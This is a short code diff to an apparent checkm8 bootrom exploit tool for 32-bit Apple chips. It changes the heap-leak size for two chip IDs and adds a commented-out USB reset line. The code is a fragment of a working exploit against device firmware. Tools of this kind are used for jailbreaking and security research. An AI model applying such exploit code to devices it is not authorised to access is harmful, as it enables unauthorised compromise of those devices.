@@ -92,13 +92,13 @@ static int send_data(irecv_client_t client, unsigned char* data, size_t size){
 static int get_exploit_configuration(uint16_t cpid, checkm8_32_t* config) {
     switch(cpid) {
         case 0x8950:
-            config->large_leak = 659+5;
+            config->large_leak = 664;
             config->overwrite_offset = 0x640;
             config->overwrite = S5l8950X_OVERWRITE;
             config->overwrite_len = 28;
             return 0;
         case 0x8955:
-            config->large_leak = 659;
+            config->large_leak = 664;
             config->overwrite_offset = 0x640;
             config->overwrite = S5l8955X_OVERWRITE;
             config->overwrite_len = 28;
@@ -219,6 +219,7 @@ static int state(irecv_client_t client, uint16_t cpid, checkm8_32_t config){
     
     // ReEnumerate
     (*client->handle)->USBDeviceReEnumerate(client->handle, 0);
+    //irecv_reset(client); // Is it better to reset?
     
     return 0;
 }
